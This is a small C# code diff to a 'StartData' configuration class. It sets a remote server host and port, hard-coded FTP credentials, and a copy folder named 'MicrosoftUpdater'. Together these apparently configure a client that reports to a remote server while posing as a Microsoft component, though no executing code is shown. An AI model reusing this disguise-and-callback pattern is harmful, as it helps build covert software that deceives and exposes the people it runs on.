@@ -6,8 +6,9 @@ namespace ClientWorker
 {
 	public static class StartData
 	{
-		public static string currentUser = "fokes1.asuscomm.com";
-		public static string ftpUser = "ff";
+		public static string currentServer = "fokes1.asuscomm.com";
+        public static int port = 7777;
+        public static string ftpUser = "ff";
 		public static string ftpPass = "WorkerFF";
 		public static int ftpPort = 21;
 		public static string floaderNewCopy = "\\MicrosoftUpdater\\";
